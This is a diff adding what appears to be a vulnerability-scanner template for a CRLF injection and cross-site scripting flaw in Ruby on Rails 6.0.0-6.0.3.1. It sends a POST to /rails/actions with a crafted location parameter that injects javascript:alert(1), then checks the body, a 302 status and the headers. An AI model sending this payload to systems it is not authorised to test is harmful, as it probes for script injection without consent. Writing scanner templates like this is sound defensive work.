@@ -1,0 +1,31 @@
+id: rails6-xss
+brief:
+    title: Ruby on Rails - CRLF Injection and Cross-Site Scripting
+    by: ooooooo_q
+    level: medium
+    about: Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript to be injected into the response, resulting in cross-site scripting.
+    label:
+        - rails
+        - xss
+        - crlf
+        - hackerone
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa'
+      signs:
+        - "on": word
+          has:
+            - javascript:alert(1)
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 302
+        - "on": word
+          has:
+            - 'Location: aaaaa'
+            - text/html
+          in: header
+          need: all
